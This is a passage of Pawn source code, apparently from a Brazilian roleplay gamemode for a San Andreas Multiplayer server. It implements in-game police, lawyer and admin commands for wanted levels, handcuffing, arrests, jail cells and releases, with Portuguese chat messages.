	    else if(IsPlayerInDynamicCP(playerid, CP_44))
	    {
	        SendClientMessage(playerid, COR_AMARELO, "Bem-vindo(a) à loja de roupas {FFFFFF}DIDIERSACHS.");
            ShowModelSelectionMenu(playerid, skins_didiersachs, "Skins ~w~~h~DidierSachs");
		}
		else if(IsPlayerInDynamicCP(playerid, CP_45))
	    {
	        SendClientMessage(playerid, COR_AMARELO, "Bem-vindo(a) à loja de roupas {FFFFFF}SUB URBAN.");
            ShowModelSelectionMenu(playerid, skins_suburban, "Skins ~w~~h~Sub Urban");
		}
	    SendClientMessage(playerid, AZUL_WE, "Selecione a skin que deseja usar. {FF1E1E}Mas atenção! Basta clicar uma única vez.");
	    SendClientMessage(playerid, AZUL_WE, "O preço de cada skin é de R$500,00 em dinheiro.");
		return 1;
	}
	if(!strcmp(cmd, "/procurar", true))
	{
	    if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || aInfo[playerid][Admin] == 1)
	    {
 			if(pInfo[playerid][fardado] == 0 && aInfo[playerid][Admin] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você precisa está fardado(a) para procurar um(a) jogador(a)!");
			    return 1;
			}
			tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
          	{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /procurar [ID] [Motivo]");
				return 1;
         	}
  	      	new
				id = strval(tmp)
			;
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
  			if(!strlen(result))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Procurar [ID] [Motivo]");
				return 1;
	     	}
        	if(!IsPlayerConnected(id))
           	{
            	SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	         	return 1;
        	}
        	if(Procurou[playerid] > gettime())
			{
			    format(gStr, sizeof(gStr), "Aguarde %d segundos para poder procurar um(a) jogador(a)!", Procurou[playerid] - gettime());
			    SendClientMessage(playerid, COR_ERRO, gStr);
				return 1;
			}
   	     	if(playerid == id)
          	{
				SendClientMessage(playerid, COR_ERRO, "Você não pode colocar você mesmo na lista de procurados!");
				return 1;
          	}
	     	if(GetPlayerWantedLevel(id) > 0)
        	{
				SendClientFormat(playerid, COR_AMARELO, "O(A) jogador(a) %s já está na lista de procurados!", PlayerName(id));
				return 1;
          	}
         	GameTextForPlayer(id, "~r~FUGITIVO!", 3000, 0);
 			SendClientFormat(id, VERMELHO_WE, "{FFFFFF}%s {FF1E1E}colocou você na lista de procurados pelo motivo: {FFFFFF}%s", PlayerName(playerid), result);
          	SendClientFormat(playerid, VERMELHO_WE, "Você colocou {FFFFFF}%s {FF1E1E}na lista de procurados pelo motivo: {FFFFFF}%i", PlayerName(id), result);
     		format(s5Doze, sizeof(s5Doze), "{FFFFFF}%s {1E90FF}foi posto(a) na lista de procurados pelo(a) %s {FFFFFF}%s{1E90FF}. Motivo: {FFFFFF}%s", PlayerName(id), NomePatente(playerid), PlayerName(playerid), result);
			SendClientMessageToAll(AZUL_WE, s5Doze);
			new
				L_Estrela
			;
          	L_Estrela = GetPlayerWantedLevel(id);
     		SetPlayerWantedLevel(id, L_Estrela + 1);
          	Procurou[playerid] = gettime() + 60;
		}
		else
		{
 			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
	    return 1;
	}
	if(!strcmp(cmd, "/plimparficha", true))
	{
	    if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || aInfo[playerid][Admin] == 1)
	    {
	    	if(pInfo[playerid][fardado] == 0 && aInfo[playerid][Admin] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você precisa está fardado(a) para remover um(a) jogador(a) da lista de procurados(as)!");
			    return 1;
			}
			tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
       		{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /plimparficha [ID] [Motivo]");
				return 1;
          	}
  	     	new
			   	id = strval(tmp)
	   		;
          	if(!IsPlayerConnected(id))
         	{
            	SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	      		return 1;
          	}
   	      	if(playerid == id)
         	{
				SendClientMessage(playerid, COR_ERRO, "Você não pode remover você mesmo da lista de procurados(as)!");
				return 1;
         	}
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
  			if(!strlen(result))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /plimparficha [ID] [Motivo]");
			  	return 1;
	    	}
	     	if(GetPlayerWantedLevel(id) <= 0)
          	{
          	    format(gStr, sizeof(gStr), "O(A) jogador(a) %s não está sendo procurado(a)!", PlayerName(id));
				SendClientMessage(playerid, COR_ERRO, gStr);
				return 1;
         	}
 			format(gStr, sizeof(gStr), "Você limpou um crime da ficha do(a) jogador(a) %s - Motivo: %s", PlayerName(id), result);
 			SendClientMessage(playerid, AZUL_WE, gStr);
			GameTextForPlayer(id, "~y~~h~REMOVIDO!", 1000, 0);
         	format(gStr, sizeof(gStr), "%s limpou um crime de sua ficha, Motivo: %s.", PlayerName(playerid), result);
 			SendClientMessage(id, AZUL_WE, gStr);
			SetPlayerWantedLevel(id, GetPlayerWantedLevel(id) -1);
			if(GetPlayerWantedLevel(id) > 0)
			{
				format(gstring, sizeof(gstring), "%s teve um crime de sua ficha limpa pelo(a) oficial %s - Motivo: %s", PlayerName(id), PlayerName(playerid), result);
				SendClientMessageToAll(AZUL_WE, gstring);
			}
			if(GetPlayerWantedLevel(id) <= 0)
			{
				format(gstring, sizeof(gstring), "%s teve a ficha limpa pelo(a) oficial %s - Motivo: %s", PlayerName(id), PlayerName(playerid), result);
				SendClientMessageToAll(AZUL_WE, gstring);
			}
		}
		else
		{
 			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/algemar", true))
	{
	    if(pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || aInfo[playerid][Admin] == 1)
	    {
	    	if(pInfo[playerid][fardado] == 0 && aInfo[playerid][Admin] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você precisa está fardado(a) para algemar um(a) jogador(a)!");
			    return 1;
			}
			tmp = strtok(cmdtext, idx);
         	if(!strlen(tmp))
        	{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Algemar [ID] [Motivo]");
				return 1;
         	}
  	    	new
			  	id = strval(tmp)
		  	;
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
  			if(!strlen(result))
			{
			 	SendClientMessage(playerid, COR_ERRO, "Uso válido: /Algemar [ID] [Motivo]");
			 	return 1;
	     	}
         	if(!IsPlayerConnected(id))
         	{
              	SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	          	return 1;
          	}
        	if(Algemou[playerid] == 1)
       		{
           	  	SendClientMessage(playerid, COR_ERRO, "Aguarde 1 minuto para algemar novamente!");
           	  	return 1;
      		}
      		if(Algemou[playerid] > gettime())
			{
			    format(gStr, sizeof(gStr), "Aguarde %d segundos para poder algemar um(a) jogador(a)!", Algemou[playerid] - gettime());
			    SendClientMessage(playerid, COR_ERRO, gStr);
				return 1;
			}
   	      	if(playerid == id)
          	{
				SendClientMessage(playerid, COR_ERRO, "Você não pode algemar você mesmo!");
				return 1;
      		}
	     	if(Algemado[id] == 1)
         	{
				SendClientFormat(playerid, COR_AMARELO, "O(A) jogador(a) %s já está algemado(a)!", PlayerName(id));
				return 1;
         	}
         	if(IsPlayerInAnyVehicle(playerid))
			{
				SendClientMessage(playerid, COR_ERRO, "Você não pode algemar de dentro de um veículo!");
				return 1;
			}
			if(IsPlayerInAnyVehicle(id))
			{
				SendClientFormat(playerid, COR_ERRO, "Você não pode algemar %s pois ele(a) está dentro de um veículo!", PlayerName(id));
				return 1;
			}
          	if(GetDistanceBetweenPlayers(playerid, id) > 15)
        	{
             	SendClientMessage(playerid, COR_ERRO, "Você está muito longe, chegue mais perto!");
				return 1;
         	}
         	//TogglePlayerControllable(id, false);
         	ClearAnimations(id);
         	SetPlayerSpecialAction(id, SPECIAL_ACTION_CUFFED);
          	GameTextForPlayer(id, "~w~ALGEMADO!", 3000, 0);
          	SendClientFormat(id,COR_AMARELO,"%s algemou você pelo motivo: {FFFFFF}%s", PlayerName(playerid), result);
			SendClientFormat(playerid,COR_AMARELO,"Você algemou o(a) jogador(a) %s pelo motivo: {FFFFFF}%s", PlayerName(id), result);
         	Algemou[playerid] = gettime() + 60;
          	Algemado[id] = 1;
         	P_Liberado[id] = SetTimerEx("LiberadoParaAndar", 30000, false, "d", id);
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
	    return 1;
	}
	if(!strcmp(cmd, "/desalgemar", true))
	{
	    if(pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || aInfo[playerid][Admin] == 1)
	    {
 			if(pInfo[playerid][fardado] == 0 && aInfo[playerid][Admin] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você precisa está fardado(a) para desalgemar um(a) jogador(a)!");
			    return 1;
			}
			tmp = strtok(cmdtext, idx);
         	if(!strlen(tmp))
          	{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Desalgemar [ID]");
				return 1;
          	}
  	      	new
				id = strval(tmp)
			;
       		if(!IsPlayerConnected(id))
          	{
         		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	          	return 1;
      		}
   	    	if(playerid == id)
         	{
				SendClientMessage(playerid, COR_ERRO, "Você não pode algemar você mesmo!");
				return 1;
        	}
	      	if(Algemado[id] == 0)
        	{
				SendClientFormat(playerid, COR_AMARELO, "O(A) jogador(a) %s não está algemado!", PlayerName(id));
				return 1;
          	}
          	if(IsPlayerInAnyVehicle(playerid))
			{
				SendClientMessage(playerid, COR_ERRO, "Você não pode desalgemar de dentro de um veículo!");
				return 1;
			}
			if(IsPlayerInAnyVehicle(id))
			{
				SendClientFormat(playerid, COR_ERRO, "Você não pode desalgemar %s pois ele está dentro de um veículo!", PlayerName(id));
				return 1;
			}
          	if(GetDistanceBetweenPlayers(playerid, id) > 15)
         	{
             	SendClientMessage(playerid, COR_ERRO, "Você está muito longe, chegue mais perto!");
				return 1;
         	}
          	GameTextForPlayer(id, "~w~DESALGEMADO!", 3000, 0);
 			SendClientFormat(id, AZUL_WE, "%s desalgemou você.", PlayerName(playerid));
         	SendClientFormat(playerid, AZUL_WE, "Você desalgemou o(a) jogador(a) %s", PlayerName(id));
         	SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
      		TogglePlayerControllable(id, true);
      		KillTimer(P_Liberado[id]);
         	Algemado[id] = 0;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
	    return 1;
	}
	if(!strcmp(cmd, "/prender", true))
	{
	    if(pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == EXERCITO || aInfo[playerid][Admin] == 1)
	    {
	        if(pInfo[playerid][fardado] == 0 && aInfo[playerid][Admin] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você precisa está fardado(a) para prender um(a) jogador(a)!");
			    return 1;
			}
			tmp = strtok(cmdtext, idx);
          	if(!strlen(tmp))
       		{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /prender [ID] [Motivo]");
				return 1;
           	}
  	 		new
			   	id = strval(tmp)
	   		;
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
  			if(!strlen(result))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Prender [ID] [Motivo]");
			  	return 1;
	    	}
           	if(!IsPlayerConnected(id))
         	{
             	SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	          	return 1;
          	}
        	if(Prendeu[playerid] > gettime())
			{
			    format(gStr, sizeof(gStr), "Aguarde %d segundos para poder prender um(a) jogador(a)!", Prendeu[playerid] - gettime());
			    SendClientMessage(playerid, COR_ERRO, gStr);
				return 1;
			}
   	    	if(playerid == id && aInfo[playerid][Admin] == 0)
        	{
				SendClientMessage(playerid, COR_ERRO, "Você não pode prender você mesmo!");
				return 1;
         	}
	     	if(pInfo[id][Preso] > 0)
        	{
				SendClientFormat(playerid, COR_AMARELO, "O(A) jogador(a) %s já está preso(a)!", PlayerName(id));
				return 1;
         	}
         	if(GetPlayerWantedLevel(id) <= 0)
         	{
				format(gStr, 128, "O(A) jogador(a) %s não está na lista de procurados(as)!", PlayerName(id));
				SendClientMessage(playerid, COR_ERRO, gStr);
				return 1;
          	}
       		if(IsPlayerInAnyVehicle(playerid))
			{
				SendClientMessage(playerid, COR_ERRO, "Você não pode prender de dentro de um veículo!");
				return 1;
			}
			if(IsPlayerInAnyVehicle(id))
			{
				SendClientFormat(playerid, COR_ERRO, "Você não pode prender %s com ele(a) dentro de um veículo!", PlayerName(id));
				return 1;
			}
          	if(GetDistanceBetweenPlayers(playerid, id) > 15)
     		{
             	SendClientMessage(playerid, COR_ERRO, "Você está muito longe, chegue mais perto!");
				return 1;
          	}
          	if(pInfo[id][procMorto] == true)
          	{
          	    SendClientMessage(playerid, COR_ERRO, "Você não pode prender um(a) jogador(a) morto(a)!");
          	    return 1;
			}
          	GameTextForPlayer(id, "~w~~h~PRESO!", 3000, 0);
 			SendClientFormat(id, 0x3366FFAA, "%s prendeu você pelo Motivo: {FFFFFF}%s", PlayerName(playerid), result);
        	SendClientFormat(playerid, 0x33CCFFAA, "Você prendeu %s. Motivo: {FFFFFF}%s", PlayerName(id), result);
     		format(s5Doze, sizeof(s5Doze), "%s foi preso pelo(a) %s %s.", PlayerName(id), NomePatente(playerid), PlayerName(playerid));
			SendClientMessageToAll(AZUL_WE, s5Doze);
			if(ComBolsa[id] == true)
			{
			    RemovePlayerAttachedObject(id, 3);
			    ComBolsa[id] = false;
			}
			if(pPatente[playerid] < 20)
			{
				SendClientMessage(playerid, AZUL_WE, "Você é recruta e recebe R$1.000 pelo serviço prestado.");
				GivePlayerCash(playerid, 1000);
			}
			else if(pPatente[playerid] >= 20 && pPatente[playerid] < 60)
			{
				SendClientMessage(playerid, AZUL_WE, "Você é sargento e recebe R$1.300 pelo serviço prestado.");
				GivePlayerCash(playerid, 1300);
			}
			else if(pPatente[playerid] >= 60 && pPatente[playerid] < 100)
			{
				SendClientMessage(playerid, AZUL_WE, "Você é subtenente e recebe R$1.700 pelo serviço prestado.");
				GivePlayerCash(playerid, 1700);
			}
			else if(pPatente[playerid] >= 100 && pPatente[playerid] < 170)
			{
				SendClientMessage(playerid, AZUL_WE, "Você é tenente e recebe R$2.000 pelo serviço prestado.");
				GivePlayerCash(playerid, 2000);
			}
			else if(pPatente[playerid] >= 170 && pPatente[playerid] < 270)
			{
				SendClientMessage(playerid, AZUL_WE, "Você é capitão e recebe R$2.500 pelo serviço prestado.");
				GivePlayerCash(playerid, 2500);
			}
			else if(pPatente[playerid] >= 270 && pPatente[playerid] < 390)
			{
				SendClientMessage(playerid, AZUL_WE, "Você é major e recebe R$3.000 pelo serviço prestado.");
				GivePlayerCash(playerid, 3000);
			}
			else if(pPatente[playerid] >= 390 && pPatente[playerid] < 500)
			{
				SendClientMessage(playerid, AZUL_WE, "Você é coronel e recebe R$3.700 pelo serviço prestado.");
				GivePlayerCash(playerid, 3700);
			}
			else if(pPatente[playerid] >= 500 && pPatente[playerid] < 800)
			{
				SendClientMessage(playerid, AZUL_WE, "Você é comandante e recebe R$4.500 pelo serviço prestado.");
				GivePlayerCash(playerid, 4500);
			}
			else if(pPatente[playerid] >= 800 && pPatente[playerid] < 1500)
			{
				SendClientMessage(playerid, AZUL_WE, "Você é general e recebe R$5.200 pelo serviço prestado.");
				GivePlayerCash(playerid, 5200);
			}
			else if(pPatente[playerid] >= 1500)
			{
				SendClientMessage(playerid, AZUL_WE, "Você é marechal e recebe R$6.000 pelo serviço prestado.");
				GivePlayerCash(playerid, 6000);
			}
			pPatente[playerid] += 1;
			Algemado[id] = 0;
        	Prender(id);
     		if(aInfo[playerid][Admin] == 0)
			{
            	Prendeu[playerid] = gettime() + 60;
         	}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
	    return 1;
	}
	if(!strcmp(cmd, "/mandarcela", true))
	{
	    if(pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == EXERCITO || aInfo[playerid][Admin] == 1)
	    {
	        if(pInfo[playerid][fardado] == 0 && aInfo[playerid][Admin] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você precisa está fardado(a) para prender um(a) jogador(a)!");
			    return 1;
			}
			tmp = strtok(cmdtext, idx);
          	if(!strlen(tmp))
       		{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /mandarcela [ID]");
				return 1;
           	}
  	 		new
			   	id = strval(tmp)
	   		;
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
           	if(!IsPlayerConnected(id))
         	{
             	SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	          	return 1;
          	}
   	    	if(playerid == id && aInfo[playerid][Admin] == 0)
        	{
				SendClientMessage(playerid, COR_ERRO, "Você não pode mandar a si mesmo para as celas!");
				return 1;
         	}
	     	if(pInfo[id][Preso] < 0)
        	{
				SendClientFormat(playerid, COR_ERRO, "O(A) jogador(a) %s não está preso(a)!", PlayerName(id));
				return 1;
         	}
          	if(GetDistanceBetweenPlayers(playerid, id) > 15)
     		{
             	SendClientMessage(playerid, COR_ERRO, "Você está muito longe, chegue mais perto!");
				return 1;
          	}
	        if(!IsPlayerInRangeOfPoint(id,5.0,1562.0298,-1671.2778,5.8066) || !IsPlayerInRangeOfPoint(id,5.0,1565.9313,-1671.7671,5.8066) || !IsPlayerInRangeOfPoint(id,5.0,1569.8096,-1671.9797,5.8066) ||
			!IsPlayerInRangeOfPoint(id,5.0,1573.8180,-1672.3195,5.8066) || !IsPlayerInRangeOfPoint(id,5.0,1577.6306,-1672.3116,5.8066) || !IsPlayerInRangeOfPoint(id,5.0,1577.6334,-1672.2010,2.0466) ||
			!IsPlayerInRangeOfPoint(id,5.0,1573.4969,-1672.2004,2.0466) || !IsPlayerInRangeOfPoint(id,5.0,1569.5760,-1672.4891,2.0466) || !IsPlayerInRangeOfPoint(id,5.0,1565.8594,-1671.9883,2.0466) ||
			!IsPlayerInRangeOfPoint(id,5.0,1561.6692,-1671.9108,2.0466))
			{
			    SendClientMessage(playerid, COR_ERRO, "O(A) preso(a) não está fora das celas!");
			    return 1;
			}
			new randp = random(sizeof(SpawnPreso));
    		SetPlayerPos(id, SpawnPreso[randp][0], SpawnPreso[randp][1], SpawnPreso[randp][2]);
    		SendClientFormat(id,COR_AMARELO,"O(A) oficial %s lhe mandou para as celas!", PlayerName(playerid));
    		SendClientFormat(playerid,COR_AMARELO,"Você mandou %s para as celas!", PlayerName(id));
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
	    return 1;
	}
	if(!strcmp(cmd, "/soltarall", true))
	{
	    if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
	    {
	        SendClientMessage(playerid, COR_AMARELO, "Todos soltos! (Comando em desenvolvimento)");
	        for(new i = 0; i < MAX_PLAYERS; ++i)
	        {
	            if(pInfo[i][Abuser] == 0 && pInfo[i][Preso] == 1)
	            {
	                pInfo[i][Preso] = 0;
	                LiberarPrisao(i);
	            }
	        }
	    }
	    return 1;
	}
	if(!strcmp(cmd, "/soltar", true))
	{
	    if(pInfo[playerid][Prof] == ADVOGADO || aInfo[playerid][Admin] == 1)
	    {
			tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
        	{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Soltar [ID]");
				return 1;
          	}
  	     	new
			 	id = strval(tmp)
			;
          	if(!IsPlayerConnected(id))
          	{
             	SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	       		return 1;
          	}
          	format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(id));
         	if(WE_GetInt(gFile, "Abuser") == 1)
         	{
            	SendClientMessage(playerid, COR_ERRO, "Esse(a) jogador(a) é abuser e foi preso(a) por um(a) administrador(a)!");
             	SendClientMessage(playerid, COR_ERRO, "Somente um(a) adminstrador(a) pode solta-lo(a)!");
	     		return 1;
       		}
       		if(Soltou[playerid] > gettime())
			{
			    format(gStr, sizeof(gStr), "Aguarde %d segundos para poder soltar um(a) jogador(a)!", Soltou[playerid] - gettime());
			    SendClientMessage(playerid, COR_ERRO, gStr);
				return 1;
			}
   	    	if(playerid == id)
         	{
				SendClientMessage(playerid, COR_ERRO, "Você não pode soltar você mesmo!");
				return 1;
      		}
	     	if(pInfo[id][Preso] == 0)
        	{
				SendClientMessage(playerid, COR_ERRO, "Esse(a) jogador(a) não está preso(a)!");
				return 1;
        	}
        	if(cAdvogadop[id] < gettime())
        	{
    			SendClientMessage(playerid, COR_ERRO, "Esse(a) jogador(a) não pediu um(a) advogado(a)!");
				return 1;
        	}
 			SendClientFormat(id, 0x3366FFAA, "O(A) advogado(a) %s soltou você. Não cometa mais nenhum crime ou será preso novamente!", PlayerName(playerid));
 			SendClientMessage(id, COR_BRANCO, "Foi retirado de sua conta bancaria R$3000 para pagar o advogado.");
          	SendClientFormat(playerid, 0x33CCFFAA, "Você soltou da prisão o(a) jogador(a) %s", PlayerName(id));
          	SendClientMessage(playerid, COR_BRANCO, "Você recebe R$3000 pelo serviço prestado, o dinheiro foi depositado em sua conta bancária.");
			pInfo[id][Preso] = 0;
			format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
			format(pFile, sizeof(pFile), "Contas/%s.ini", PlayerName(id));
			WE_SetInt(gFile, "SaldoBanco", WE_GetInt(gFile, "SaldoBanco") +3000);
		    WE_SetInt(pFile, "SaldoBanco", WE_GetInt(pFile, "SaldoBanco") -3000);
			if(aInfo[playerid][Admin] == 0)
			{
            	Soltou[playerid] = gettime() + 60;
          	}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não é um(a) advogado(a)!");
		}
	    return 1;
	}
	if(!strcmp(cmd, "/aprender", true))
	{
	    if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Corregedor] == 1)
	    {
			tmp = strtok(cmdtext, idx);
          	if(!strlen(tmp))
       		{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /aPrender [ID] [Tempo] [Motivo]");
				return 1;
           	}
  	 		new
			   	id = strval(tmp)
	   		;
			tmp = strtok(cmdtext, idx);
          	if(!strlen(tmp))
       		{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /aPrender [ID] [Tempo] [Motivo]");
				return 1;
           	}
  	 		new
			   	iTempo = strval(tmp)
	   		;
	   		if(iTempo < 1 || iTempo > 600)
	   		{
				SendClientMessage(playerid, COR_ERRO, "Tempo somente de 1 à 600 minutos!");
				return 1;
	   		}
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
  			if(!strlen(result))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /aPrender [ID] [Tempo] [Motivo]");
			  	return 1;
	    	}
           	if(!IsPlayerConnected(id))
         	{
             	SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	          	return 1;
          	}
	     	if(pInfo[id][Preso] == 1)
        	{
				SendClientFormat(playerid, COR_AMARELO, "O(A) jogador(a) %s já está preso!", PlayerName(id));
				return 1;
         	}
          	GameTextForPlayer(id, "~w~~h~PRESO POR ~n~QUEBRAR REGRAS!", 3000, 0);
 			SendClientFormat(id, VERMELHO_WE, "Você foi preso por %s {1E90FF}(Motivo: %s, Tempo: %d Minutos)", PlayerName(playerid), result, iTempo);
        	SendClientFormat(playerid, AZUL_WE, "Você prendeu o(a) jogador(a) %s (Motivo: %s, Tempo: %d Minutos)", PlayerName(id), result, iTempo);
         	SendClientFormatAll(VERMELHO_WE, "%s prendeu o(a) jogador(a) %s {1E90FF}(Motivo: %s, Tempo: %d Minutos)", PlayerName(playerid), PlayerName(id), result, iTempo);
            format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(id));
			WE_SetInt(gFile, "Abuser", 1);
			Algemado[id] = 0;
	 		SetPlayerWantedLevel(id, 0);
		    pInfo[id][Preso] = iTempo*60;
		    ResetPlayerWeapons(id);
			new randp = random(sizeof(SpawnPreso));
    		SetPlayerPos(playerid, SpawnPreso[randp][0], SpawnPreso[randp][1], SpawnPreso[randp][2]);
			KillTimer(T_Preso[id]);
			T_Preso[id] = SetTimerEx("LiberarPrisao", 1000, false, "d", id);
			pInfo[playerid][Abuser] = 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
	    return 1;
	}
	if(!strcmp(cmd, "/aprenderoff", true))
	{
	    if(aInfo[playerid][Admin] == 1)
	    {
			tmp = strtok(cmdtext, idx);
		    if(!strlen(tmp))
		    {
		        SendClientMessage(playerid, COR_ERRO, "Uso válido: correto /aPrenderOFF [Nick] [Tempo] [Motivo]");
                return 1;
			}
			format(gFile, sizeof(gFile), "Contas/%s.ini", tmp);
  			if(!fexist(gFile))
			{
				SendClientMessage(playerid, COR_ERRO, "Não existe nenhuma conta com esse nick!");
				return 1;
			}
			tmp = strtok(cmdtext, idx);
          	if(! strlen(tmp))
       		{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /aPrenderOFF [Nick] [Tempo] [Motivo]");
				return 1;
           	}
  	 		new
			   	iTempo = strval(tmp)
	   		;
	   		if(iTempo < 1 || iTempo > 600)
	   		{
				SendClientMessage(playerid, COR_ERRO, "Tempo somente de 1 à 600 minutos ! ");
				return 1;
	   		}
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
  			if(!strlen(result))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /aPrenderOFF [Nick] [Tempo] [Motivo]");
			  	return 1;
	    	}
        	SendClientMessage(playerid, 0x33CCFFAA, "(PuniçãoOff) Conta punida com sucesso!");
			WE_SetInt(gFile, "Abuser", 1);
		    WE_SetInt(gFile, "Preso", iTempo*60);
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
	    return 1;
	}
	if(!strcmp(cmd, "/asoltar", true))
	{
	    if(aInfo[playerid][Admin] == 1)
	    {
			tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
        	{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /aSoltar [ID]") ;
				return 1;
          	}
  	     	new
			 	id = strval(tmp)
			;
          	if(!IsPlayerConnected(id))
          	{
             	SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	       		return 1;
          	}
	     	if(pInfo[id][Preso] == 0)
        	{
				SendClientFormat(playerid, COR_AMARELO, "O(A) jogador(a) %s não está preso!", PlayerName(id));
				return 1;
        	}
